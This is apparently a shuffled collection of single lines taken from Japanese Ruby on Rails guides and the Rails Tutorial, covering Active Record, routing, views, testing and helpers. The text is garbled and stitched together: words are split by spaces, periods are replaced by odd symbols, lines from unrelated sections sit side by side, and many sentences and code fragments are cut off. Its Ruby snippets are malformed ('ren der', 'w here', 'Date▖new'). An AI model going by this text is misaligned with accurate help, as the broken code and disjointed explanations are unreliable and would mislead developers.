この 時点 で は 、 デフォルト 以外 の gem を インストール する 必要 は あ り ま せ ん 。
上 の コード で は 、 \ kode { add_ column } メソッド を 使用 し て \ kode { password_digest }   カラム を \ kode { users } テーブル に 追加 し て い ま す 。
この フォーム ページ の ソース を 表示 し て 、 生成 さ れ た HTML を よく 調べ て み る と 、 フォーム の ` action ` 属性 の 送信 先 が `/articles/new ` に な っ て しま っ て い ま す 。
文字 列 を 使用 する こと も でき ま す ▟ この 文字 列 は 後 で ` eval ` で 評価 さ れ る ため 、 実行 可能 な 正し い Ruby コード を 含 ん で い る 必要 が あ り ま す 。
    ren der   action :   " special _ show "
作成 し た Relationship データ モデル を 図 \ ref { fig : relationship_model } に 示 し ま す 。
指定 でき る オプション は 次 の シンボル ` : memory _ store ` 、 `:file_store ` 、 `: mem_cache_store ` 、 `:null_store ` の いずれ か 、 また は キャッシュ API を 実装 する オブジェクト で す 。
* `before_remove `
#   エラー メッセージ を 表示 し 、 サイン インフォーム を 再 描画 する 。
これ は 、 エンジン が 名前 空間 化 さ れ る の と 同様 、 エンジン の アセット も 同様 に 名前 空間 化 さ れ る 必要 が あ る から で す 。
と い う 書 き 方   ( リスト \ ref{ code :micropost _validity_ test } )   が 、 以下 の よう に 書き換え られ ま す 。
` : on ` オプション は 、 バリデーション 実行 の タイミング を 指定 し ま す 。
*  `order `
ブロック が 与え られ た 場合 、 ` sum ` は イテレータ に な っ て コレクション の 要素 を yield し 、 そこ から 返 さ れ た 値 を 合計 し ま す 。
   belongs_to  : customer ,   dependent :  : destroy ,
  >>  x   + =   1
###  シンプル な 例
##### ` beginning _ of_quarter ` 、 `end _of_quarter `
  <%=  ren der   " shared /footer "  %>
なお 、 今回 は   ( 先頭 が 大 文字 の )   " Rails " と する ため に \ kode {alt } テキスト を 明示 的 に 設定 し て い ま す 。
Blorgh : : Engine ▖ routes▖draw   do
`object ` が 属 する クラス の メソッド 値 の 既存 の 戻 り 値 を コレクション に し た ` check _ box ` タグ を 返 し ま す 。
Rails 経験 の 長 い 多く の 開発 者 から 、 おかげ で Web アプリケーション の 開発 が とても 楽し く な っ た と い う 意見 を いただ い て い ま す 。
" 2010 - 0 7 - 27   23 : 37 : 0 0 " ▖ to_datetime # =>  Tue ,   27   Jul   2010   23 : 37 : 0 0   + 0000
* `production ` 環境 は 、 アプリケーション を 世界 中 に 公開 する 本番 で 使用 さ れ ま す 。
\ texttt { curl} など の コマンドライン ツール を 使用 する と 、 \ texttt { PATCH } リクエスト を この 形式 で 送信 する こと が でき ま す 。
Rails の 哲学 に は 、 以下 の 2 つ の 主要 な 基本 理念 が あ り ま す 。
   validates : name ,   presence :  true ,  length : {  minimum :   3   }
Active   Record の モデル クラス また は モデル インスタンス に 対 し て ` logger ` メソッド を 呼び出 す と 、 この ロガー を 取り出せ ま す 。
` redirect_to ` を 実行 し た 後 、 コード は そこ で 実行 を 終了 し 、 ブラウザ から の 次 の リクエスト を 待 ち ま す   ( 通常 の スタンバイ 状態 ) 。
}╼╼%  subsection   login_with _remembering   ( end ) ╼╼\ subsection { ユーザー を 忘れ る } %  ( fold) ╼\ label{ sec : forgetting _ users }╼╼
d ▖ prev _week(:saturday )    # =>  Sat ,   0 1   May  2010
# <User   id :   2 ,   name :  " A   Nother " ,  email :   " another @ example ▖org " ,   created_at :
読者 の Paul   Fioravanti が この 用語 を 提案 し て くれ ま し た ▟ ありがとう ござ い ま す 。
しかし この 画面 だけ で は ほとんど 実用 性 が な い の で 、 ` Book ` モデル を 作成 し 、 ` Books Controller ` に index アクション を 追加 し て み ま しょ う 。
  * `app ` ディレクトリ ツリー
これ に よ っ て 以下 の SQL が 生成 さ れ ま す 。
\ ref{ sec : rails_ routes } で は この デフォルト ページ を 削除 し 、 カスタマイズ し た ホーム ページ に 置き換え る 予定 で す 。
利用 可能 な ヘルパー を 1 つ ずつ 見 て い き ま しょ う 。
この よう に し て 名前 付き ルート で クエリ パラメータ を 定義 する と 、 Rails が 特殊 な 文字 を 自動 的 に エスケープ し て くれ ま す 。
フィード の HTML を テスト する
d   =  DateTime▖ current
表示 結果 を 今 すぐ 確認 し た い の で あ れ ば 、 図 \ ref { fig : layout_no_ logo_or_ custom_css } で 確認 でき ま す
Factory   Girl を 使用 し た テスト を 実行 し て み る と すぐ に 気 が 付 く と 思 い ま す が 、 正直 言 っ て \emph { 遅 い } で す 。
      if @user ▖ save
class   LineItem <  ActiveRecord : : Base
1 つ の 条件 を 複数 の バリデーション で 共用 でき る と 便利 な こと が あ り ま す ▟ これ は ` with _options ` を 使用 する こと で 簡単 に 実現 でき ま す 。
   validates : order ,   presence :  true
<%=   link_to  ' Ad   details ' ,   magazine_ad _ path (@magazine ,  @ad )  %>
逆 に 、 ( 実行 結果 を 示 さ な い )   通常 の コメント で は 矢印 を 使用 し な い こと 。
Object ▖qualified_const_defined ? ( " Math : : PI " )        # => true
* `: through ` 関連 付け と 併用 する こと は でき ま せ ん 。
以下 の コード に つ い て 考え て み ま しょ う ▟ クライアント を 10 人 検索 し て 郵便 番号 を 表示 し ま す 。
###  グループ 化
たとえば 「 Gemfile 」 と い う ファイル 名 を 検索 する と 、 \ kode { Gemfile } と \ kode { Gemfile ▖ lock } を 含め 、 候補 が 6 つ も 表示 さ れ て しま い ま す 。
本 チュートリアル で 使用 し て い る 取り決め や 表記 は 、 説明 不要 な もの が ほとんど で す 。
def empty?
config ▖ assets▖ compile  =  true
  <body >
*  ` readonly`
*   モデル および モデル 内 の データ を 表現 する
ログ イン 中 の ユーザー 用 の レイアウト の リンク を 変更 する
cookie に は 文字 列 や 数字 など の 単純 な データ だけ を 保存 する こと を お 勧め し ま す 。
*   [ キャッシュ の 最適 化 ] ( http://code ▖google▖ com/speed/ page - speed/ docs/caching ▖ html )
Asset   Pipeline で LESS を 使 う こと も でき ま す ▟ 詳細 は \ href { http://rubygems ▖org / gems/ less - rails - bootstrap}{\ texttt { less - rails - bootstrap }   gem } を 参照 し て くださ い 。
アプリケーション が これ ら の 機能 に 依存 し て い る 場合 は 、 [ ` activesupport - json_encoder` ] (https://github▖ com/rails/activesupport - json_encoder )   gem を Gemfile に 追加 する こと で 以前 の 状態 に 戻 す こと が でき ま す 。
一方 、 例えば 、 以下 の コード を 実行 する と
# <tt > collection ▖exists? </tt >▖  If  the  collection   has   not   already  been   (<tt > collection ▖exists? </tt > と 同値 ▟ コレクション が 読み込 ま れ て お ら ず 、 )
class   Part  <  ActiveRecord : : Base
true ▖ dup  # => TypeError :   can't   dup   TrueClass
ドキュメント 関連 で 貢献 し た い 場合 は 、 [ API   ドキュメント 作成 の ガイドライン ] ( api_ documentation_guidelines ▖html )   と [ Rails   ガイド の ガイドライン ] ( ruby _ on_rails _ guides_guidelines ▖html )   を よく 読 ん で から に し て くださ い 。
特定 の 属性 に アクセス する ため の 、 ファイル アップロード 用 input タグ を 返 し ま す 。
実際 の 理由 は 、 Rails チーム は この 種 の 内部 メソッド の 動作 を 必要 に 応 じ て リリース ごと に 変更 でき る よう に し た い から で す 。
##### ` limit `
### `errors▖ add `
( もし 注釈 を 最新 の 状態 に 保 ち た い の で あ れ ば 、 データ モデル が 変わ る たび に \ kode {annotate } を 実行 し な けれ ば な ら な い こと に 注意 し て くださ い ) 。
( この 属性 を 実装 する の は \ ref{ sec : administrative_users } に な っ て から で す ) 。
Ajax は クライアント 側 だけ で な く 、 ある 程度 サーバー 側 で の サポート も 必要 で す 。
たとえば 、 `: before_ save ` コール バック を 使用 し て 、 オブジェクト が 保存 さ れ る 直前 に 何 か を 実行 する こと が でき ま す 。
具体 的 に は 、 \emph {spec }   と 呼 ば れ る テスト ファイル を 作成 し 、 その ファイル に 、 \emph { 本書 で 指示 さ れ た 通り に } テスト コード を コピー ＆ ペースト し て くださ い 。
( リスト \ ref{ code : log _ in_password _ reset } と 図 \ ref { fig : forgot_ password _ link } 参照 )
上 の 出力 は 、 ユーザー オブジェクト を コンソール 用 に 出力 し た もの で す 。
これ ら の クラス 同士 の 関係 を 図 \ ref { fig: demo_controller_ inheritance } に 示 し ま す 。
これ は リスト \ ref{ code :rails_ routes } で 使用 さ れ て い ま し た 。
         format▖html { redirect_to ( @user ,   notice :  ' ユーザー が 正常 に 作成 さ れ ま し た ▟')  
この コード を じゅん を おっ t 組み立て て み る と 、 動作 が よく わか り ま す 。
Item▖transaction   do
( リスト \ ref{ code : sidebar_micropost _count } を 参考 に し て み て くださ い )
Turing スクール で は 、 生徒 が 卒業 後 に 職 を 見つけ る こと を 保証 し て い て 、 見つか ら な けれ ば 授業 料 を 返還 し て い ま す 。
|                     |   404                | : not _ found                        |
ActiveRecord : : ConnectionTimeoutError   -  could   not  obtain  a   database  connection   within   5   seconds ▖ 
Action   View の テンプレート は 、 HTML タグ の 合間 に ERB   ( Embedded  Ruby )   を 含 む 形式 で 書 か れ ま す 。
Client ▖find_ by   first _ name :  'Lifo'
また 、 HTML ヘッダー は 論理 的 な 単位 を 形成 する ため 、 一 箇所 に まとめ る 必要 も あ り ま す 。
フォロー し て い な い ユーザー の 画面
>>  FooBar ▖ new▖to_json # => "{\ " foo\ " :\" bar\ " } "
ビュー が 整 っ て き ま し た ▟ いよいよ   [ フォロー する ]   [ フォロー 解除 する ]   ボタン を 動作 さ せ ま しょ う 。
# => < input   id = " gender _male "   name = " gender " type =" radio "   value = " male "  />
デフォルト の ストア 名 は `: cookie_store ` で す ▟ この 他 に ` : active_ record_store ` 、 `: mem_cache_store ` 、 また は カスタム クラス の 名前 を 指定 でき ま す 。
\ kode {update_ columns } を 使用 する テンプレート
Gemfile に 新し く 追加 し た gem を 実際 に インストール する に は 、 \ kode {bun dle   update } と \ kode {bun dle  install } を 実行 し ま す 。
ページ ネーション さ れ た ユーザー 一覧 ページ
$ bun dle   exec   guard  init ╼ Writing   new  Guardfile  to   / home/ubuntu/workspace/sample_app/Guardfile╼ 00 : 51 : 32   -   INFO   -   minitest   guard   added to   Guardfile ,   feel  free   to  edit  it
安心 し て \ kode {t } オブジェクト に 仕事 を 任せ れ ば よ い の で す 。
Rails の デフォルト の ` belongs_to ` 関連 付け は 、 ほとんど の 場合 カスタマイズ 不要 で す が 、 時 に は 関連 付け の 動作 を カスタマイズ し た く な る こと も あ る と 思 い ま す 。
以下 の いく つ か の 例 を 参照 し て 理解 を 深め て くださ い 。
ネスト し た ハッシュ に パラメータ を 含め た い 場合 は 、 この ファイル に 以下 の コンテンツ を 含め て 追加 し ま す 。
` cache ` メソッド は 、 ( アクション 全体 や ページ 全体 で は な く )   ビュー の 断片 を キャッシュ する メソッド で す 。
これ は リスト \ ref{ code :error _messages_test } で 使用 さ れ て い ま し た 。
#   Read   more :  https://github▖ com/rails/turbolinks
###  必要 なら 何 度 で も トライ する
\ ref{ sec : pagination } で は ページ ネーション を 使 い ま し た が 、 今回 も 同じ 方法 で この 問題 を 解決 し ま す 。
また 、 Active   Record を 理解 する 上 で 、 「 \emph { 有効 性   ( Validity ) } 」 と い う 概念 も 重要 で す 。
CarrierWave を 通 し て S 3 を 使 う よう に 修正 する
次 に 、 プロジェクト の ファイル を リポジトリ に 追加 し ま す 。
( 今後 非 推奨 に な る 計画 あり )
上 の コード に は 途中 に 改行 が 含 ま れ て い る に も かかわ ら ず で す 。
サンプル アプリケーション の Home ページ の モックアップ
失敗 し た テスト の エラー メッセージ を もっと 詳し く 見 て い き ま しょ う
` : foreign_key ` オプション を 使用 する と 外部 キー の 名前 を 直接 指定 する こと が でき ま す 。
`LoadError ` の 拡張
     " 私 は # { super } "
\ kode {self } キー ワード を 与え る と 、 この 代入 に よ っ て ユーザー の \ kode {remember_token } 属性 が 期待 どおり に 設定 さ れ ま す
リスト \ ref{ code :rails_ routes } の Users リソース が 提供 する RESTful な ルート
  <%=  fields _ for  @ person ▖ permis sion   do  | permis sion_fields | %>
適用 さ れ る プリ プロセス の 種類 は 、 アセット ファイル の 拡張 子 に よ っ て 決ま り ま す 。
#   options   = args ▖ extract _options !
著作 権 と ライセンス
ルーティング プロキシ メソッド 呼び出し を 省略 し た この よう な アプリケーション ルーティング ヘルパー メソッド を 、 エンジン 内 で レンダリング さ れ る テンプレート から 呼び出 そ う と する と 、 未 定義 メソッド 呼び出 し エラー が 発生 する こと が あ り ま す 。
end _of_day
もし すでに master ブランチ に い る 場合 は 、 1 行 目 の コマンド を 実行 する 必要 は あ り ま せ ん ) 。
#   SELECT   clients ▖ id ,   clients▖ name   FROM   clients
ルート URL に アクセス する と Home ページ が 表示 さ れ る
表示 結果 の 中 で 重要 な の は 最初 の 列 の 数値 で す ▟ これ は \emph { プロセス id } 、 略 し て pid と 呼 ば れ る もの で す 。
       format▖html { ren der   layout :  'my _ layout'  }
その よう な メソッド に は ` downcase ` 、 `gsub ` 、 `strip` 、 ` chomp ` 、 `un derscore ` など が あ り ま す 。
部分 テンプレート また は パーシャル は 、 出力 を 扱 い やす く 分割 する ため の 仕組み で す 。
トークン は ハッシュ 値 に 変換 し て から データベース に 保存 する 。
Loading   development  environment   in  sandbox
必要 で あ れ ば 画像 ファイル を サブ ディレクトリ に 置 い て 整理 する こと も でき ま す ▟ この 画像 に アクセス する に は 、 ディレクトリ 名 を 含め て 以下 の よう に タグ で 指定 し ま す 。
サイド バー で 表示 する ユーザー 情報 の パーシャル
  = >   10 2 4
# =>  " Oh   dear !  
ユーザー の マイクロ ポスト の 配列 を 返 す 。
リスト \ ref{ code : first _create_action } の コメント と 、 上 の 再録 コメント で も 重ね て 指摘 し て い る よう に 、 この 実装 は 最終 形 で は あ り ま せ ん 。
キャプション と し て 指定 さ れ た テキスト を 使用 し て 送信 ボタン を 作成 し ま す 。
User ▖ w here ( state :  'inactive ' )
id = \ kode { 1 } の マイクロ ポスト を 更新 する アクション
従 っ て 、 この よう な オブジェクト は ` dup ` メソッド や ` clone ` メソッド で 複製 する こと は でき ま せ ん 。
コントローラ を 名前 空間 に よ っ て グループ 化 する こと も でき ま す 。
@order ▖ customer  = @customer
出力 結果 は 以下 の よう に な り ま す 。
c 2 ▖ save   #  ActiveRecord : : StaleObjectError を 発生
\ ref{ sec : account_activation_mailer } で は 、 実際 に この 決定 が 重要 に な っ て き ま す 。
####  すべて の Active   Support を 読み込 む
Home 、 Help 、 About 、 Contact の 各 ページ へ の リンク が 正し く 動 く か 確かめ る
###  development 環境 を 構築 する
##### `: content_type ` オプション
リスト \ ref{ code : users _migration } で 生成 さ れ た User の データ モデル
duplicate  = array ▖ deep_dup
d   =  Date▖ new (2010 ,   5 ,   8 )  # =>  Sat ,   0 8   May  2010
以後 本 チュートリアル の 演習 を 解 く 際 に は 、 以下 の よう に 演習 用 トピック ブランチ を 別途 作成 し て そこ で 行 う こと を お すすめ し ま す 。
###  リクエスト 内容 に 応じ て 制限 を 加え る
   pool :   5
同様 に 、 分 が ゼロ の 場合 、 秒 も 値 を 与え られ な い 限り ゼロ に な り ま す 。
NOTE :   返 さ れ る の は ` option ` だけ で す ▟ 従 っ て 、 出力 結果 の 外側 を 適切 な HTML  `select ` タグ で 囲 む 必要 が あ り ま す 。
###  アセット を 設定 する
Apache と NGINX で は この オプション が サポート さ れ て お り 、 以下 の よう に ` config/ environments/production ▖rb ` で 有効 に する こと が でき ま す 。
|                     |  413               | : request_entity_ too_large        |
名前 付き ルート
ユーザー の 一覧 ページ を 実装 する ため に 、 まず は セキュリティ モデル に つ い て 考え て み ま しょ う 。
    require   APP _ PATH
`: constraints ` オプション を 使用 する と 、 動的 セグメント の URL フォーマット を 特定 の 形式 に 制限 する こと が でき ま す 。
上 の 説明 に 基 い て 、 ダイジェスト トークン を The above  discus sion   suggests putting   the digest– token  comparison  into an   \ kode {authenticated ? }
    mattr_accessor   : log_activity
上 の よう に 、 name と email 属性 が 期待 どおり 設定 さ れ て い る こと が わか り ま す 。
=> "\#{ foo}   bar "
` first ! ` メソッド の 動作 は 、 マッチ する レコード が 見つか ら な い 場合 に ` ActiveRecord : : Record NotFound ` 例外 が 発生 する 点 を 除 い て 、 ` first ` メソッド と まったく 同じ で す 。
もちろん 、 ユーザー 表示 ページ の 最終 的 な 状態 は これ と は 大き く 異な り ま す し 、 この メール アドレス が この まま 一般 に 公開 さ れ る よう な こと も あ り ま せ ん 。
\ href { http://sivers▖org / } { デレック シバーズ   ( Derek   Sivers) }  ( \ href { http://sivers▖org / }{ sivers▖org } )
` class_attribute ` メソッド は 、 1 つ 以上 の 継承 可能 な クラス の 属性 を 宣言 し ま す ▟ その クラス 属性 は 、 その 下 の どの 階層 で も 上書き 可能 で す 。
デフォルト 値 は ` false ` で す 。
Any  modifications   you   make   will   be   rolled  back   on  exit
*   エンジン の 生成 方法
新し い Rails アプリケーション を ゼロ から 作成 し た の は これ で 3 度 目 ▟ 今回 も 必要 な gem の インストール 、 リモート リポジトリ へ の プッシュ 、 production 環境 まで 行 っ た 。
User と その Micropost は   \ kode { has\_many}   ( 1 対 多 )   の 関係 性 が あ る
サンプル アプリケーション の \ kode {config } ディレクトリ の 内容
< http://local host : 3000/articles/new > を ブラウザ で 開 い て 試 し て み ま しょ う 。
: name
` : as ` オプション を 使用 する こと で 、 どんな ルーティング に も 名前 を 指定 でき ま す 。
( これ に つ い て は 後 で 詳し く 説明 し ま す ) 。
Rails   3 ▖ 1 から Rails   3 ▖ 2 へ の アップグレード
on   deploying   ( end ) ╼╼  \ section { 最後 に } %  ( fold) ╼  \ label{ sec : beginning_ conclusion}╼╼
Ruby   on   Rails   チュートリアル
( \ kode { vim } と い う コマンド 名 は 、 使用 し て い る 「 フレーバー 」 に よ っ て は \ kode {gvim} や \ kode {mvim } など に な っ て い る こと が あ り ま す ▟ )
   Loading   development  environment
     エントリ を 記入 する 場合 は 80 文字 目 で 折り返 し ま す )
( なお 、 これ は \ ref{ sec : sessions_controller } で 生成 し た Sessions コントローラ と は 無 関係 で す の で ご 注意 くださ い ) 。
上 を 実行 する こと で バージョン を 確認 でき ま す 。
変更 後 の パス を 使用 し て も 、 ルーティング 先 は 依然 と し て ` new ` アクション と ` edit ` アクション の まま で す 。
*  `around _perform `
図 \ ref { fig: riding _ rails_environment } の よう に 詳細 な 情報 が 表示 さ れ ま す   ( バージョン 番号 など は 異な る こと も あ り ま す ) 。
同一 生成 元 ポリシー の バイパス と クロス オリジン ( cross - origin ) リクエスト を サイト ごと に 許可 し ま す 。
ad へ の URL に は magazine も な けれ ば な り ま せ ん 。
    identical    config/ boot ▖ rb
  #  Last - Modified フィールド が 存在 する 場合 は E Tag の 使用 が 妨げ られ る
リダイレクト 先 は 、 ユーザー が 開 こ う と し て い た ページ に し て あげ る の が 親切 と い う もの で す 。
\ chapter { Rails 風味 の Ruby } %  ( fold ) ╼
╼   This   is   the   sample  application   for   the tutorial ▖
実際 に 動作 する \ kode { destroy } アクション を 追加 する
\ kode {index } アクション が 保護 さ れ て い る こと を テスト する 。
最初 は データベース 接続 の プール は 空 で 、 必要 に 応 じ て 追加 接続 が 作成 さ れ 、 接続 プール の 上限 に 達 する まで 接続 が 追加 さ れ ま す 。
緑   ( Green )
Sublime  Text を 使用 し て い れ ば 、 \ texttt { View >  Ruler  >   78 } 、 また は \ texttt { View >  Ruler  >   80 } で 設定 でき ま す 。
/▖bun dle
####  プレース ホルダ を 使用 し た 条件
この メソッド に は 破壊 的 な バージョン の ` String # remove ! ` も あ り ま す 。
TIP :   後 に 解説 し ま す が 、 `@ article ▖ save ` は 保存 に 成功 し た か どう か を 真偽 値   ( true また は false )   で 返 し ま す 。
o " )    # => true
Rails コンソール を 起動 し 、 example\_user の コード を \ kode {require } し て 、 自作 し た クラス を 試し に 使 っ て み ま しょ う 。
{ 0 } 図 5 ▖ 5 { / 0 } { 1 } タイポグラフィー スタイル を 追加 する ▟ \ href { http://railstutorial ▖org / images/figures/sample_app_typography _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
   include   ActiveModel : : Validations
身近 に Rails 使 い がい な い 場合 は 、 IRC ルーム や rails - core メーリング リスト で お 問い合わせ くださ い 。
作成 し た コード を リスト \ ref{ code :relationship_belongs_to } に 示 し ま す
   def  read_cookie
`@ article ▖ save ` が 失敗 し た ら その こと を ユーザー に 表示 し て あげ な い と 不 親切 で す 。
|   GET        | / geocoder      |  geocoders# show     |   1 つ しか な い geocoder リソース を 表示 する     |
これ が その 原因 で す 。
   scope  : inactive ,  -> { rewhere   state :  'inactive'  }
    return unless  cache_configured ?
上 の 例 で は 、 ネスト の 内側 に あ る \ kode {h 1 } と い う ルール は 、 \ kode {▖center } の ルール を 継承 し て い ま す 。
[ master   ( root - commit )   df 0 a 62 f ]   Initialize  repository
レイアウト ファイル の 役割 に つ い て は この 後 説明 し ま す が 、 まず は 作業 開始 前 に レイアウト ファイル の ファイル 名 を 変更 し て お き ま しょ う 。
( Application ヘルパー を インク ルード する こと で 、 リスト \ ref{ code :title_helper } の \ kode { full \_title } ヘルパー が 利用 でき て い る 点 に 注目 し て くださ い ) 。
エンジン は この 名前 を 使用 し て ` User ` オブジェクト を 新規 作成 する か 、 その 名前 が 既に あ る か どう か を 調べ ま す 。
これ は リスト \ ref{ code :a_test _ for _ invalid _ submis sion } で 使用 さ れ て い ま し た 。
{ 0 } 図 5 ▖ 8 { / 0 }   { 1 } \ href { http://local host : 3000/about}{/about } で 表示 さ れ る About ページ { / 1 }
resources   : photos,   path_ names: {  new: 'make ' ,  edit :  ' change'  }
ある コレクション の 内容 が 空 で あ っ た ら どう な る か 。
def  set_expert_ locale
テスト 環境 の デバッグ など 、 他 の 環境 で console を 実行 する 必要 が 生 じ た 場合 は 、 環境 を パラメータ と し て \ texttt{ console } スクリプト に 渡 す こと が でき ま す 。
顧客 と 、 顧客 の 注文 を まとめ て 削除 する 作業 は さらに 簡単 で す 。
この サブ セレクト は 、 集合 の ロジック を   ( Rails で は な く )   データベース に 保存 する の で 、 より 効率 が 高ま り ま す
<% @ article ▖ comments ▖each   do  | comment| %>
111 ▖ 2345 ▖ to_s(:rounded ,   significant :  true )   # = >   11 1
  else
` config/application ▖rb ` および 環境 固有 の 設定 ファイル ( ` config/ environments/production ▖rb ` など ) に 設定 を 記入 する こと で 、 Rails の すべて の コンポーネント に それ ら の 設定 を 渡 す こと が でき ま す 。
< div  class = " field_ with _errors " >
$  cd   ▖▖
Client ▖ order ( " orders_count   ASC " ) ▖ order ( " created_at   DESC " )
   validates : name ,  uniqueness: { scope : : year ,
Contact ページ の ビュー を 追加 する   (  \ passing   )
*   Action   View で 提供 さ れ る ヘルパー の 紹介 と 、 カスタム ヘルパー の 作成 法
ルーティング は 既に 定義 さ れ て い る の で 、 リクエスト は アプリケーション の `/articles/new ` に 送 ら れ ま す 。
*  `collection ▖ w here ( ▖▖▖)
フォーム タグ を 作成 する ため の メソッド を 多数 提供 し ま す ▟ これ ら の メソッド は 、 テンプレート に 割り当て られ て い る Active   Record オブジェクト に 依存 し な い 点 が FormHelper と 異な り ま す 。
*   リクエスト から パラメータ を パース し て 、 ` params ` を 設定 し ま す 。
t   =  Time▖ local ( 2010 ,   3 ,   28 ,   1 ,   59 ,   59 )
### ` ActiveSupport: : Callbacks ` で は 明示 的 に ブロック を 使用 する こと
リスト \ ref{ code : footer_css } の とき
リレーション の 構築 時 に ` lock ` を 使用 する と 、 選択 し た 行 に 対 する 排他 的 ロック を 取得 でき ま す 。
特に 、 Rails の ルーティング システム は モデル に 対 し て ` to_ param ` メソッド を 実行 する こと で 、 ` : id ` プレース ホルダ の 値 を 取得 し て い ま す 。
ここ に あ る 、 フォロー し て い る ユーザー 用 と フォロワー 用 の 名前 付き ルート を この 後 使用 し ま す 。
単語 が 回文 で あ る か どう か を 確認 でき る と い う こと で す
ユーザー から 提供 さ れ た データ に 対 し て ` image_tag ` など の ヘルパー を 使用 する 場合 は ご 注意 くださ い 。
この 節 で は 、 \emph { ステータス フィード }   ( 第 \ ref { cha : following _ users } 章 で 完成 さ せ ま す )   の 最初 の ヒント を お 見せ し ま す 。
( \ kode { users } テーブル を 作 る ため の )   User モデル の マイ グレーション
# =>  ActiveSupport: : HashWithIndifferentAccess
この 動作 は 、 ` Array # map ` を 使用 し て ` deep_dup ` メソッド を 内部 の 各 オブジェクト に 適用 する の と 似 て い ま す 。
詳細 に つ い て は Rails ガイド の 「 \ href { http://guides▖ rubyonrails ▖org/asset_pipeline ▖html } { アセット パイプライン } 」 の 項 を 参照 し て くださ い 。
デフォルト は ` true ` で あ り 、 この 場合 関連 付け られ た オブジェクト は 保存 時 に 検証 さ れ ま す 。
セキュア に ハッシュ 化 し た パスワード を 、 データベース 内 の \ kode { password\_digest } と い う 属性 に 保存 でき る よう に な る 。
d ▖ beginning _ of_quarter    # =>  Thu ,   0 1   Apr  2010
< li >`:user_ name `  -  メール サーバー で 認証 が 必要 な 場合 は ここ で ユーザー 名 を 指定 する ▟</ li >
*  `app/views/layouts/news▖html ▖erb `
## #   属性
リスト \ ref{ code : password _ reset_update_action } の 実装 で は 以下 の コード を 使用 し て 、 パスワード 再 設定 の 期限 切れ の 論理 値 テスト を User モデル に 委譲   ( delegate )   し て い ま す 。
リスト \ ref{ code :a_test _ for _ invalid _ submis sion } の とき と 同じ は 、 次 の よう に テスト を 書 き ま し た が
今回 の 場合 、 上 の コード を 参考 に 下 の よう な コード を し よう し ま s
select_datetime( Time▖now   +   4 ▖ days)
フォーム の remote オプション が オン に な っ て い る の で 、 リクエスト は Ajax リクエスト と し て ` Users Controller ` に 渡 さ れ 、 Java Script を 探 し ま す 。
< h 1 > New  article </ h 1 >
簡単 な の は ` has_and _belongs_to_many ` を 使用 する 方法 で す ▟ この 方法 で は 関連 付け を 直接 指定 でき ま す 。
= >   [ 4 ,   5 ,   6 ,   7 ,   8 ,   9 ,   10 ,   11 ,   12 ,   13 ,   14 ,   15 ,   16 ,   17 ,   18 ,   19 ,  20 ,   21 ,   22 ,   23 ,
その 前 に 、 それぞれ の 関連 付け が 適切 と な る 状況 に つ い て 簡単 に ご 紹介 し ま しょ う 。
これ は 、 定数 を 経由 し て モジュール オブジェクト に 到達 でき る と い う 意味 で す 。
この メソッド は 内部 で ` javascript_ path ` を 呼び出 し て お り 、 現在 の ホスト また は アセット 用 の ホスト と マージ し て URL を 生成 し ま す 。
これ で 、 失敗 する テスト は Home ページ を 残 す だけ と な り ま し た 。
ここ まで の 準備 が 完了 し た ら 、 いよいよ サンプル アプリケーション の 開発 を 始め ま しょ う 。
上 の URL に お け る " % 0 d % 0 a " は " \ r\ n " が URL エンコード さ れ た もの で あ り 、 Ruby に お け る CRLF 文字 で す 。
先ほど 実装 し た RSpec の テスト を 実行 し ま す 。
GRO UP   BY  date ( created_at )
*   ジョブ の 登録 方法
[ クラス 属性 ] ( # class 属性 ) も 参照 し て くださ い 。
最後 に 、 以下 の よう に プロファイル へ の リンク も 追加 し ま す 。
issue レポート に は 、 最低 で も タイトル と issue の 明快 な 説明 が 必要 で す 。
ページ タイトル が 正し く 表示 さ れ な い 問題 を 解決 する ため に 、 \ kode { full_title } と い う ヘルパー を 作成 する こと に し ま す 。
###  sass - rails
ユーザー が メール の リンク を クリック し た ら 、 アプリケーション は メール アドレス を キー に し て ユーザー を 探 し 、 データベース 内 に 保存 し て お い た 再 設定 用 ダイジェスト と 比較 する こと で トークン を 認証 する 。
self を 省略 し た 結果 を リスト \ ref{ code :activation_digest_test } に 示 し ま す 。
` config/ environments/development ▖ rb ` を 更新 し て 以下 の よう に する こと で 、 ダイジェスト を オフ に でき ま す 。
create      app/views/blorgh/articles/_form ▖html ▖erb
続 い て 、 `Blorgh : : Article ` モデル の 設定 を この 新し い 設定 に 切り替え ま す 。
      t ▖ belongs_to  : assembly
\ kode {cat } コマンド で 公開 鍵 を 出力 する 。
    gem  'sass - rails ' ,    '~ >   3 ▖ 1 ▖ 7 '
Rails で は 、 「 関連 付け ( アソシエーション :   association ) 」 と は 2 つ の Active   Record モデル 同士 の つながり を 指 し ま す 。
flash [ :symbol ]  =  " a  symbol "
Relationships コントローラ で Ajax リクエスト に 対応 する
\ kode {dependent :  : destroy } オプション を 使 う と 、 関連 付け さ れ た オブジェクト が 削除 さ れ る と 同時 に 、 自分 自身 も 削除 する
Client ▖ includes( " orders " ) ▖ w here ( first _ name :  'Ryan' ,  orders: { status :  'received ' }) ▖ count
        route     get   " users/new "
#   Word が 鏡 文字 か どう か
" Home |  Ruby   on   Rails   Tutorial   Sample  App "
この コマンド が 効 か な い こと も 多 い の で 、 その とき は いよいよ \ texttt { pkill } コマンド で \ texttt { spring } の 名前 を 指定 し て kill し ま す 。
\ kode {relationships } テーブル に インデックス を 追加 する
# => [ " David " ]
` with _indifferent_access ` メソッド は 、 レシーバ に 対 し て ` ActiveSupport: : HashWithIndifferentAccess ` を 実行 し た 結果 を 返 し ま す 。
1 ▖ordinal     # => " st "
< video  src= " / videos/movie ▖ogg "  />
モデル を 手作り し た の で す から 、 それ に 合 っ た コントローラ も 作 っ て み た く な り ま す 。
スコープ ブロック を 使用 し て この よう な カスタマイズ を 行 う こと が でき ま す 。
#   例外 発生
   def  paid_ with _card ?
= >   17
ルーティング の 調査 と テスト
Rails の ビュー で は 膨大 な 組み込 み 関数 を 使用 する こと が でき ま す が 、 それ に 加え て 新し い 関数 を 作成 する こと も でき ま す 。
しかし 幸運 な こと に 、 Rails で は フォーム 用 の テスト を 書 く こと が でき 、 こう い っ た プロセス を 自動 化 する こと が でき ま す 。
    get  '* path ' , to :  'blacklist # index' ,
この メソッド は 、 例外 クラス を 表 す 任意 の 数値 を 受け取 り ま す 。
|   id   | select_type | table    | type |  possible_keys  |
config ▖ assets▖raise_runtime_errors  =  false
# =>  Mon ,   0 2   Aug  2010   23 : 21 : 11   UTC   + 0 0 : 0 0
